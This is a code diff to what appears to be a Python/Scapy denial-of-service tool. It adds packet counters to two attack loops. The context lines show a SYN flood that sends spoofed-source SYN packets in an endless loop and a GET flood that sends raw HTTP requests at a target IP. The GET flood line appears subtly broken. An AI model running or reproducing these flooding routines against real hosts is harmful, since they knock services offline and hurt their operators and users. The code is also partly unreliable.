@@ -83,6 +83,7 @@ def synflood(tgtIP, port, srcIP):
         while True:
             send(IP(src=srcIP, dst=tgtIP)/TCP(dport=port, flags='S'))
             logging.info("{0}[{1}{2}{0}] {3}Packets sent{0}".format(RST, DGREY, count, RD))
+            count += 1
     except KeyboardInterrupt:
         logging.info(" Exiting...")
         sys.exit(0)
@@ -96,6 +97,7 @@ def GETflood(tgtIP):
         while True:
             send(IP(src=srcIP, dst=tgtIP)/TCP()//b"GET / HTTP/1.0\r\n\r\n")
             logging.info("{0}[{1}{2}{0}] {3}Requests sent{0}".format(RST, DGREY, count, RD))
+            count += 1
     except KeyboardInterrupt:
         logging.info(" Exiting...")
         sys.exit(0)
